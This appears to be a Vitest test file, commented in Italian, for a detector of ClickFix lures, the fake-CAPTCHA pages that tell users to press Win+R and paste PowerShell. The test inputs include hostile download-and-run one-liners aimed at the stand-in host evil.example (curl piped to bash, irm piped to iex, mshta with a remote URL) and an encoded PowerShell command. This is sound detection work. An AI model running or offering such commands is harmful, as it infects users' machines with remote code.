import { describe, expect, it } from 'vitest';
import { clickFixFindings, detectClickFix } from '../clickfix.js';

/**
 * ClickFix: la pagina finge una CAPTCHA rotta e dice all'utente di premere
 * Win+R e incollare. Negli appunti c'è già PowerShell offuscato.
 *
 * La regola che questi test proteggono: un segnale solo non basta. Una
 * discussione tecnica può contenere `powershell -enc` senza essere un attacco,
 * e "premi Win+R" da solo è un consiglio di supporto legittimo. È la
 * combinazione a fare la differenza.
 */
describe('rilevamento ClickFix', () => {
  it('riconosce lo schema completo in italiano', () => {
    const result = detectClickFix(
      'Per verificare che sei umano: premi Windows + R, poi Ctrl+V e Invio. ' +
        'powershell -enc SQBFAFgAKA==',
    );
    expect(result.detected).toBe(true);
    expect(result.score).toBeGreaterThanOrEqual(90);
  });

  it('riconosce lo schema completo in inglese', () => {
    const result = detectClickFix(
      "I'm not a robot — press Win+R, paste and press Enter: powershell -enc AAA",
    );
    expect(result.detected).toBe(true);
  });

  it('riconosce il download eseguito dalla shell', () => {
    const result = detectClickFix('curl https://evil.example/x.sh | bash');
    expect(result.score).toBeGreaterThanOrEqual(50);
  });

  it('riconosce irm ... | iex', () => {
    const result = detectClickFix('irm https://evil.example/a.ps1 | iex');
    expect(result.detected).toBe(true);
  });

  it('riconosce mshta con URL remoto', () => {
    expect(detectClickFix('mshta https://evil.example/p.hta').detected).toBe(true);
  });

  it('non scatta su una conversazione normale', () => {
    expect(detectClickFix('ciao ragazzi, come va la partita?').detected).toBe(false);
    expect(detectClickFix('domani gioco alle 21, vi va?').detected).toBe(false);
  });

  it('non scatta su un solo segnale debole', () => {
    // "premi Ctrl+V" da solo è un consiglio innocuo.
    const result = detectClickFix('copia il testo e premi Ctrl+V nella chat');
    expect(result.detected).toBe(false);
  });

  it('produce un rilevamento marcato come proveniente dall\'OCR', () => {
    const findings = clickFixFindings('Win+R poi Ctrl+V, incolla e Invio: powershell -enc X', 'OCR');
    expect(findings[0]?.code).toBe('OCR_CLICKFIX');
  });

  it('ignora un pattern personalizzato scritto male senza esplodere', () => {
    expect(() => detectClickFix('testo qualsiasi', ['[regex non valida'])).not.toThrow();
  });
});
